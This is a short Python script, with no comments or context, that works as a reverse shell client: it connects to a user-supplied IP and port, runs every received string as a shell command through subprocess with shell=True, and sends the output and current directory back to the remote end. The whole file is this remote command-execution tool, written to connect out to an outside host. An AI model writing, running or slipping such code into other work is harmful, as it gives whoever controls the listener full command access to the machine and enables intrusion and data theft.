
import socket
import os
import sys
import subprocess

port = int(input("Port: "))
ip = raw_input('IP: ')

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

def main():

    while True:
    
        try:
    
            data = sock.recv(1024)
            p = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            o = p.stdout.read() + p.stderr.read() + '\n' + os.getcwd()+'==> '
            if data.startswith("cd")==True:
                os.chdir(data[3:].replace('\n', ''))
            sock.send(o)

        except Exception as error:
            print(error)
            main()


main()